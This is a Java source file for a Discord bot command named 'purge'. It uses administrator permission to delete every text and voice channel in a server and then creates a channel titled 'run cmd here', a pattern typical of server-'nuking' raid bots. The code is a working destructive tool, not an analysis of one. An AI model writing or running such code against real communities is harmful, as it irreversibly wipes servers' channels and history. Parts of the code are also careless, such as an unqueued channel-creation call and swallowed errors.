package com.visions.dev.Commands;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import lombok.SneakyThrows;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.GuildChannel;
import net.dv8tion.jda.api.entities.VoiceChannel;
import net.dv8tion.jda.api.entities.templates.Template;

import java.util.concurrent.TimeUnit;

public class ClearChannelsCommand extends Command {

    public ClearChannelsCommand() {
        this.name = "purge";
        this.botPermissions = new Permission[]{Permission.ADMINISTRATOR};
        this.guildOnly = false;
        this.ownerCommand = true;
    }

    @SneakyThrows
    public void execute(CommandEvent event) {



        event.getMessage().delete().queue();

        for (GuildChannel channel : event.getGuild().getChannels()) {
            try {
                channel.delete().queue();
            } catch (Exception e) {
                e.printStackTrace();
                event.getGuild().createTextChannel("run cmd here");
            }

            TimeUnit.MILLISECONDS.sleep(150);
        }

        for (VoiceChannel channelVoice : event.getGuild().getVoiceChannels()) {
            try {
                channelVoice.delete().queue();
                TimeUnit.MILLISECONDS.sleep(50);
            } catch (Exception e) {
                System.out.println("fair");
            }
        }

        event.getGuild().createTextChannel("run cmd here");

    }
}
